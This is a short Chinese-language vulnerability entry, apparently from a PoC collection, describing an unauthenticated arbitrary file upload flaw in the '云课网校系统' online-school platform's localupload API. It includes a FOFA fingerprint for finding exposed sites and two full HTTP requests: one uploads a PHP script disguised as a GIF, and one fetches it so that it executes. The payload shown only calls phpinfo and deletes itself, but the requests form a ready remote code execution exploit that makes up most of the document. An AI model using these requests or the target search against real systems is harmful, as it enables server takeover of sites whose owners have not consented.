## 云课网校系统 localupload 任意文件上传漏洞

## 漏洞描述
云课网校系统 `localupload` 接口未验证用户与文件类型，攻击者可上传任意脚本文件执行。

## 网络空间测绘
```
fofa: body="/static/libs/common/jquery.stickyNavbar.min.js"
```

## POC
```
POST /api/uploader/localupload HTTP/1.1
Host: [请补充实际域名]
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Accept-Encoding: gzip
Content-Type: multipart/form-data; boundary=---WebKitFormBoundaryFfJZ4P1AZBixjELj
Content-Length: 225

---WebKitFormBoundaryFfJZ4P1AZBixjELj
Content-Disposition: form-data; name="file"; filename="lwzqpe.php"
Content-Type: image/gif

<?php phpinfo();unlink(__FILE__);?>

---WebKitFormBoundaryFfJZ4P1AZBixjELj--
```

```
GET /upload/video/0/lwzqpe.php HTTP/1.1
Host: [请补充实际域名]
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Accept-Encoding: gzip
Cookie: PHPSESSID=qbheqmmrv20to9d1ch6mvjm5ij
```

## 参考
- 社区情报

